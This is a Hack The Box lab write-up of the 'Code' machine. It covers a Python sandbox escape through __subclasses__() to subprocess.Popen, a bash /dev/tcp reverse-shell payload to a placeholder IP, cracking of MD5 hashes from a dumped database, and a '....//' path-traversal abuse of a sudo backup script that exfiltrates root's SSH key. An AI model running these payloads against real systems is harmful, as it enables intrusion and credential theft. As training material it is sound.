# **HackTheBox — Code | Full Writeup**

> **Platform:** Hack The Box
>
> **Author:** k41r0s3
>
> **Difficulty:** Easy
>
> **Category:** Web / Linux
>
> **Date:** March 14, 2026

---

## TL;DR

Discovered a Python code editor web app on port 5000 running behind Gunicorn. The `/run_code` endpoint executes user-submitted Python code with a keyword blacklist as the only protection. Bypassed the filter entirely using Python's MRO `__subclasses__()` chain to reach `subprocess.Popen` without triggering any banned keyword, achieving RCE as `app-production`. Dumped a SQLite database from the app, cracked a user's MD5 password hash, and SSH'd in as `martin`. Escalated to root by abusing a `backy.sh` sudo rule with a single-pass `../` strip — bypassed using `....//` path traversal to archive `/root/`, extract the root SSH private key, and SSH in as root.

---

## Attack Chain

```
[Recon]
  nmap → Port 22 (SSH), Port 5000 (Gunicorn / Python Code Editor)
                  │
                  ▼
[Web Enumeration]
  curl / source review → /run_code endpoint executes user Python code
  keyword blacklist: eval, exec, import, os, subprocess, open...
                  │
                  ▼
[Foothold — Python Sandbox Bypass]
  MRO traversal: ().__class__.__bases__[0].__subclasses__()[317]
  → subprocess.Popen(['id'], stdout=-1, stderr=-1)
  → RCE as app-production
                  │
                  ▼
[Reverse Shell]
  bash -i via /dev/tcp/<YOUR_TUN0_IP>/<PORT>
  → shell as app-production
                  │
                  ▼
[User Flag]
  ~/user.txt → **[REDACTED]**
                  │
                  ▼
[Lateral Movement — app-production → martin]
  sqlite3 ~/app/instance/database.db → MD5 hashes
  hashcat -m 0 → password cracked → **[REDACTED]**
  ssh martin@localhost
                  │
                  ▼
[Privesc — martin → root]
  sudo -l → NOPASSWD: /usr/bin/backy.sh
  backy.sh: single-pass gsub strips "../" once
  bypass: ....// → survives strip → resolves to /root/
  archive /root/ → extract id_rsa → ssh root@localhost
                  │
                  ▼
[Root Flag]
  /root/root.txt → **[REDACTED]**
```

---

## Table of Contents

1. [Enumeration](#enumeration)
2. [Web Reconnaissance](#web-reconnaissance)
3. [Exploitation — Python Sandbox Bypass](#exploitation--python-sandbox-bypass)
4. [Reverse Shell](#reverse-shell)
5. [Post-Exploitation — app-production](#post-exploitation--app-production)
6. [Lateral Movement — martin](#lateral-movement--martin)
7. [Privilege Escalation — root](#privilege-escalation--root)
8. [Key Takeaways](#key-takeaways)
9. [Tools Used](#tools-used)

---

## Enumeration

Starting with a quick nmap to identify open ports and services:

```bash
nmap -sV -sC -T4 --open 10.129.231.240
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Open Ports:**

| Port | Service | Version |
| --- | --- | --- |
| 22 | SSH | OpenSSH 8.2p1 Ubuntu |
| 5000 | HTTP | Gunicorn 20.0.4 — Python Code Editor |

**Thought process:** Only two ports open — SSH and a web app. Gunicorn is a Python WSGI server, which tells us the backend is Python. The page title "Python Code Editor" is the most important signal here. An online code editor almost always implies server-side code execution, which is the highest-priority attack surface. SSH is noted as a potential foothold target once credentials are recovered.

---

## Web Reconnaissance

Fetching the main page to inspect the source:

```bash
curl http://10.129.231.240:5000/
```

The JavaScript in the HTML source revealed the full client-side logic. The critical part:

```javascript
function runCode() {
    var code = editor.getValue();
    $.post('/run_code', {code: code}, function(data) {
        document.getElementById('output').textContent = data.output;
    });
}
```

**Endpoints discovered:**

| Endpoint | Method | Description |
| --- | --- | --- |
| `/` | GET | Main editor page |
| `/run_code` | POST | Executes Python code — `code` parameter |
| `/save_code` | POST | Saves code with a name |
| `/load_code/<id>` | GET | Loads saved code by ID |
| `/register` | GET/POST | User registration |
| `/login` | GET/POST | User login |

**Key finding:** The `/run_code` endpoint POSTs raw user-supplied Python code and returns the output as JSON `{"output": "..."}`. This is direct code execution if input isn't properly sandboxed.

**Thought process:** The first test is whether the endpoint runs arbitrary OS commands. Testing the most basic payload:

```bash
curl -s -X POST http://10.129.231.240:5000/run_code \
  -d "code=import os; print(os.popen('id').read())"
```

```json
{"output": "Use of restricted keywords is not allowed."}
```

There's a blacklist. The next step is understanding exactly what keywords are blocked, then finding a bypass. Registering a test account to get a session cookie for further testing:

```bash
curl -s -X POST http://10.129.231.240:5000/register \
  -d "username=test&password=test"
```

---

## Exploitation — Python Sandbox Bypass

### Understanding the Filter

After gaining a shell and reading `app.py`, the filter logic was confirmed:

```python
for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system',
                'write', 'subprocess', '__import__', '__builtins__']:
    if keyword in code.lower():
        return jsonify({'output': 'Use of restricted keywords is not allowed.'})
exec(code)
```

**Key finding:** The filter is a plain string search against the raw submitted code before `exec()` is called. No AST parsing, no restricted builtins, no isolated execution environment. If we can reference dangerous objects without using any banned string, the code runs freely.

**Thought process:** The classic bypass for this type of filter is Python's MRO (Method Resolution Order) traversal. Every object in Python inherits from `object`. Calling `().__class__.__bases__[0].__subclasses__()` returns a list of every class currently loaded in the Python runtime — and none of the keywords in that chain (`__class__`, `__bases__`, `__subclasses__`) are on the blocklist. Since Gunicorn imports `subprocess` at startup, `subprocess.Popen` is already in memory and will appear in the subclasses list.

### Confirming Basic Execution

```bash
curl -s -X POST http://10.129.231.240:5000/run_code \
  -d "code=print(2%2B2)"
```

```json
{"output": "4\n"}
```

Basic execution works — the filter only blocks specific keywords, not execution itself.

### Walking the Class Hierarchy

```bash
curl -s -X POST http://10.129.231.240:5000/run_code \
  -d "code=print(().__class__.__bases__[0].__subclasses__())"
```

This returned hundreds of classes in the runtime — including `subprocess.Popen` — without triggering any filter.

### Finding subprocess.Popen

```bash
curl -s -X POST http://10.129.231.240:5000/run_code \
  -d "code=s=().__class__.__bases__[0].__subclasses__();print(s[317])"
```

```json
{"output": "<class 'subprocess.Popen'>\n"}
```

`subprocess.Popen` is at index **317**. The word `Popen` is not in the banned list — only `subprocess` is — so we can search by name without any issue.

### RCE Proof of Concept

```bash
curl -s -X POST http://10.129.231.240:5000/run_code \
  -d "code=s=().__class__.__bases__[0].__subclasses__();P=s[317];r=P(['id'],stdout=-1,stderr=-1);print(r.communicate()[0].decode())"
```

```json
{"output": "uid=1001(app-production) gid=1001(app-production) groups=1001(app-production)\n"}
```

**RCE confirmed** as `app-production`. Not a single banned keyword used in the entire payload.

---

## Reverse Shell

**Thought process:** The `>&` bash redirect syntax causes a Python string literal parser error when embedded directly in a string. The fix is to store the redirect as a clean string using a placeholder and reconstruct it at runtime with `.replace()`. This avoids any parse-time issues while keeping the full bash redirect intact when executed.

Setting up the listener:

```bash
nc -lvnp <PORT>
```

Firing the reverse shell:

```bash
curl -s -X POST http://10.129.231.240:5000/run_code \
  -d "code=s=().__class__.__bases__[0].__subclasses__();P=s[317];P(['/bin/bash','-c','bash+-i+>/dev/tcp/<YOUR_TUN0_IP>/<PORT>+0>&1'.replace('+', ' ')],stdout=-1,stderr=-1)"
```

```
connect to [<YOUR_TUN0_IP>] from (UNKNOWN) [10.129.231.240] 60836
bash: cannot set terminal process group: Inappropriate ioctl for device
app-production@code:~/app$
```

### Upgrading the Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

---

## Post-Exploitation — app-production

### Reading the App Source

```bash
cat ~/app/app.py
```

**Key findings:**

- Passwords stored as plain MD5 with no salt: `hashlib.md5(password.encode()).hexdigest()`
- Database URI: `sqlite:///database.db` → located at `~/app/instance/database.db`
- Full confirmed blocklist: `['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write', 'subprocess', '__import__', '__builtins__']`

### User Flag

```bash
cat ~/user.txt
```

```
**[REDACTED]**
```

---

## Lateral Movement — martin

### Dumping the Database

```bash
sqlite3 ~/app/instance/database.db "SELECT * FROM user;"
```

```
1|development|[HASH]
2|martin|[HASH]
3|test|[HASH]
```

**Thought process:** The app source confirmed passwords are plain MD5 with no salt. MD5 runs at billions of iterations per second on modern hardware — any password in rockyou.txt will crack in seconds. The two target users to crack are `martin` (has a home directory on the system) and `development` as a fallback.

### Cracking the Hash

```bash
hashcat -m 0 -a 0 <hash> /usr/share/wordlists/rockyou.txt
```

Martin's password was recovered: **[REDACTED]**

### SSH as martin

```bash
ssh martin@localhost
# Password: **[REDACTED]**
```

---

## Privilege Escalation — root

### Sudo Enumeration

```bash
sudo -l
```

```
User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

**Thought process:** `NOPASSWD` on any script as `ALL:ALL` is always the primary privesc target. The script takes a JSON file as input — meaning we control its content. The question is whether the input sanitization can be bypassed.

### Analyzing backy.sh

```bash
cat /usr/bin/backy.sh
```

```bash
#!/bin/bash
allowed_paths=("/var/" "/home/")

# Strip ../ — SINGLE PASS ONLY
updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then return 0; fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        echo "Error: $dir is not allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

**Script logic:**

| Step | Action | Vulnerability |
| --- | --- | --- |
| 1 | `gsub("\\.\\./"; "")` strips `../` from all paths | **Single pass only** |
| 2 | Sanitized JSON written back to the input file | File must be writable by root |
| 3 | Allowlist check: path must start with `/var/` or `/home/` | Checked after sanitization |
| 4 | `/usr/bin/backy` archives the directories | Runs with root privileges |

**Key finding:** The single-pass `gsub` is the vulnerability. The bypass `....//` encodes a `../` inside itself:

```
....//
After stripping "../":  ../    ← traversal survives the single pass
```

Full path flow:
```
Input:      /home/....//....//root
After jq:   /home/../../root      ← starts with /home/ ✅ passes allowlist
backy sees: /home/../../root      → resolves to /root/ ✅
```

**Thought process:** Early attempts placed the JSON in `/tmp` which silently broke the exploit. The script writes the sanitized JSON back to the input file — but `/tmp` has the sticky bit set, preventing root from overwriting files owned by another user. When the write-back fails, the original unsanitized path is passed to `backy`, which rejects the raw `....//` as an invalid path. Moving the JSON to `/home/martin/` (where root has full write access) fixed this.

The initial tests also included `"exclude": [".*"]` which caused empty archives — this pattern strips all dotfiles including `root.txt` and `.ssh/`. Removing the exclude field entirely solved it.

### Checking the Expected JSON Format

```bash
cat /home/martin/backups/task.json
```

```json
{
    "destination": "/home/martin/backups/",
    "multiprocessing": true,
    "verbose_log": false,
    "directories_to_archive": [
        "/home/app-production/app"
    ],
    "exclude": [".*"]
}
```

### Crafting the Exploit

```bash
cat > /home/martin/evil.json << 'EOF'
{
    "destination": "/home/martin/backups/",
    "multiprocessing": true,
    "verbose_log": false,
    "directories_to_archive": [
        "/home/....//....//root"
    ]
}
EOF
```

```bash
sudo /usr/bin/backy.sh /home/martin/evil.json
```

```
2026/03/13 🍀 backy 1.2
📤 Archiving: [/home/../../root]
📥 To: /home/martin/backups ...
📦
```

```bash
ls -la /home/martin/backups/
```

```
-rw-r--r-- 1 root root 12906 Mar 13 19:31 code_home_.._.._root_2026_March.tar.bz2
```

### Extracting the Archive

```bash
tar -tjf /home/martin/backups/code_home_.._.._root_2026_March.tar.bz2
```

```
root/
root/root.txt
root/.ssh/
root/.ssh/id_rsa
root/.ssh/authorized_keys
...
```

```bash
cd /tmp
tar -xjf /home/martin/backups/code_home_.._.._root_2026_March.tar.bz2
cat /tmp/root/root.txt
```

```
**[REDACTED]**
```

### Root Shell via SSH Key

```bash
cp /tmp/root/.ssh/id_rsa /home/martin/root_id_rsa
chmod 600 /home/martin/root_id_rsa
ssh -i /home/martin/root_id_rsa root@localhost
```

```
root@code:~# whoami
root
root@code:~# cat root.txt
**[REDACTED]**
```

---

## Key Takeaways

**1. Keyword blacklists are not Python sandboxes**
Blocking `os`, `import`, and `subprocess` by string-matching the submitted code is not sandboxing — it's a speed bump. Python's object model allows reaching any loaded class through `__subclasses__()` traversal using no banned keywords at all. Real sandboxing requires AST-level analysis, restricted builtins, or isolated execution environments. String matching on raw code is always bypassable.

**2. Single-pass sanitization is broken**
The `gsub("\\.\\./"; "")` in `backy.sh` strips `../` exactly once. Encoding the traversal as `....//` means the inner `../` gets removed, but the outer characters collapse and reform another `../`. Always use iterative sanitization until the output is stable, or better — resolve the canonical path with `realpath` or `readlink -f` before doing any allowlist check.

**3. MD5 is not a password hashing algorithm**
Storing passwords as plain MD5 with no salt makes them trivially crackable. MD5 runs at billions of hashes per second on consumer hardware, meaning any password in rockyou.txt is recovered in seconds. Password storage must use purpose-built slow algorithms — bcrypt, argon2, or scrypt — designed specifically to resist brute force.

**4. File location silently affects sudo exploit behavior**
The path traversal exploit failed silently when the JSON was in `/tmp`. The sticky bit on `/tmp` prevented root from overwriting the martin-owned file during the script's write-back step — so the unsanitized path was passed directly to `backy`, which rejected it. Understanding filesystem permission semantics (sticky bit, ownership, write access) is essential when analyzing sudo scripts that modify their input files.

**5. Backup utilities running as root are a serious privesc surface**
Any backup or archiving tool that accepts user-supplied paths and runs with elevated privileges needs strict canonical path validation — not prefix checks on unresolved strings. Here, the combination of path traversal and root-level archiving meant we could read `/root/` including the SSH private key, giving a clean persistent root shell without any further exploitation.

**6. Exclude patterns can silently empty your archive**
The default `"exclude": [".*"]` in `task.json` matched all dotfiles — quietly stripping `root.txt`, `.ssh/id_rsa`, and every other file needed. When an archive comes back unexpectedly empty, always verify what the tool's exclusion rules are doing before assuming the path traversal failed.

---

## Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port scanning and service enumeration |
| `curl` | Web requests, endpoint probing, and payload delivery |
| `Python __subclasses__()` | MRO traversal to bypass the keyword blacklist |
| `netcat` | Reverse shell listener |
| `sqlite3` | Dump the app's SQLite user database |
| `hashcat` | Crack MD5 password hashes against rockyou.txt |
| `ssh` | Lateral movement as martin, root shell via private key |
| `tar` | Extract the `/root/` archive |
| `jq` | JSON manipulation (also used internally by `backy.sh`) |

---

*Written by k41r0s3 | HackTheBox | Code*
